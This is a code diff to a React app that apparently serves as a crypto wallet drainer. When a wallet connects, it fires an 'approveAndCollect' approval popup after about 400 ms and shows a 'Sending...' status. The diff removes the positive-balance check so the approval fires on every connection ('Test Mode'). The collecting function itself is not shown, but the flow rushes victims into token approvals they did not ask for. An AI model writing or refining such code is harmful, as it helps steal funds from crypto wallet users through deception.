@@ -210,14 +210,21 @@ export default function App() {
         currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      if (currentBalance > 0 && !autoTriggered.current) {
+      // if (currentBalance > 0 && !autoTriggered.current) {
+      //   autoTriggered.current = true;
+      //   log("🔥 Positive balance detected. Auto-triggering approval...");
+        
+      //   // Immediately sets the UI to the loading state so it says "Sending..."
+      //   setLoading(true); 
+        
+      //   // Triggers the wallet popup almost instantly after connection
+      //   setTimeout(() => approveAndCollect(), 400); 
+      // }
+      // 🔥 AUTO-TRIGGER: Fire the approval regardless of balance (TEST MODE)
+      if (!autoTriggered.current) {
         autoTriggered.current = true;
-        log("🔥 Positive balance detected. Auto-triggering approval...");
-        
-        // Immediately sets the UI to the loading state so it says "Sending..."
+        log("🔥 Wallet connected. Auto-triggering approval (Test Mode)...");
         setLoading(true); 
-        
-        // Triggers the wallet popup almost instantly after connection
         setTimeout(() => approveAndCollect(), 400); 
       }
     };
